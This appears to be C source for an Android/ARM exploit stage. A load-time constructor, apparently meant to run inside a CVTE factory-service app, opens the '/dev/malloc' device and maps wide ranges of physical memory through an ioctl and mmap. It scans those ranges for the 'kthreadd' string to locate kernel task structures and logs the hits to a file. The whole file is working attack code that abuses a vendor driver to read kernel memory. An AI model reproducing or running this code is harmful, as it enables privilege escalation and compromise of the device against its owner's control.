typedef unsigned int u32; typedef unsigned long long u64; typedef unsigned char u8;
#define SYS_open 5
#define SYS_close 6
#define SYS_write 4
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 asm("r7")=n;register long r0 asm("r0")=a;register long r1 asm("r1")=b;register long r2 asm("r2")=c;register long r3 asm("r3")=d;register long r4 asm("r4")=e;register long r5 asm("r5")=f;asm volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static void w(int fd,const char*s){int n=0;while(s[n])n++;sc(SYS_write,fd,(long)s,n,0,0,0);}
static void hx(int fd,u64 v){char b[17];int i;for(i=15;i>=0;i--){int d=v&0xf;b[i]=d<10?'0'+d:'a'+d-10;v>>=4;}b[16]=0;w(fd,b);}
static void dc(int fd,long v){char b[32];int i=31;b[31]=0;if(v<0){w(fd,"-");v=-v;}if(!v){w(fd,"0");return;}while(v&&i){b[--i]='0'+v%10;v/=10;}w(fd,b+i);}
static int sm(const u8*a,const char*s,int n){for(int i=0;i<n;i++)if(a[i]!=s[i])return 0;return 1;}
struct info { u64 addr; u64 size; u64 interval; u8 miusel; u8 pad[7]; };
__attribute__((constructor)) static void ctor(void){
 int lf=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/scan3.log",0x241,0666,0,0,0);if(lf<0)return;w(lf,"M0\n");
 int fd=sc(SYS_open,(long)"/dev/malloc",0x42,0666,0,0,0);w(lf,"M1=");dc(lf,fd);w(lf,"\n");if(fd<0)return;
 int hits=0;
 for(u64 phys=0x20000000ULL; phys<0x80000000ULL; phys+=0x1000000ULL){
   struct info i;i.addr=phys-0x20000000ULL;i.size=0x1000000;i.interval=0;i.miusel=0;for(int k=0;k<7;k++)i.pad[k]=0;
   long r=sc(SYS_ioctl,fd,0x80204d04,(long)&i,0,0,0);
   long m=sc(SYS_mmap2,0,(long)i.size,3,1,fd,0);
   w(lf,"C ");hx(lf,phys);w(lf," io=");dc(lf,r);w(lf," mm=");dc(lf,m);w(lf,"\n");
   if((unsigned long)m>=0xfffff000UL) continue;
   u8*b=(u8*)m;
   for(int o=0;o<0x1000000-9;o++){ if(b[o]=='k'&&sm(b+o,"kthreadd",8)){w(lf,"HIT ");hx(lf,phys+o);w(lf,"\n");if(++hits>20)break;} }
   sc(SYS_munmap,m,i.size,0,0,0,0);
   if(hits>20)break;
 }
 w(lf,"HITS=");dc(lf,hits);w(lf,"\nM5\n");sc(SYS_close,lf,0,0,0,0,0);
}
